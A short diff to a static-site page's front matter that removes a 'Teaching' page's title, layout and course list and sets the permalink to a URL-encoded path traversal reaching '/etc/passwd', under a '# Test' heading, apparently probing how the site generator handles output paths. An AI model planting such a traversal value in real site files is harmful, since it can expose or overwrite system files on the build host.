@@ -1,10 +1,5 @@
 ---
-layout: page
-title: Teaching
-permalink: /teaching/
+permalink: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ---
 
-* BI(E)-ASB
-* BI(E)-ZSB
-* BI(E)-KAB
-* BI-EHA
+# Test
